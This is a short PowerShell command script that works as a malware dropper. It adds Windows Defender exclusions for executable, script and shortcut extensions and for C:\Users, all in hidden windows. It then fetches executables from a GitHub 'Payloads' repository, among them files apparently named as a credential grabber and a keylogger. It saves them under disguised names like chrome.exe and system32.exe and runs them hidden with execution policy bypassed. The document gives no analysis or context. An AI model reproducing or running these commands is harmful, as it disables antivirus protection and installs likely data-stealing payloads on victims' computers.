powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".src"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"


powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Cplus-grabber.exe -o C:\Users\chrome.exe
powershell.exe -w Hidden C:\Users\chrome.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/NAZPAT.exe -o C:\Users\system32.exe
powershell.exe -w Hidden C:\Users\system32.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/keyboard-new.exe -o C:\Users\runtime.exe
powershell.exe -w Hidden C:\Users\runtime.exe


powershell -ep bypass iwr -uri  https://raw.githubusercontent.com/rude90/Payloads/main/jre.exe -o C:\Users\Public\jre.exe 
powershell.exe C:\Users\Public\jre.exe






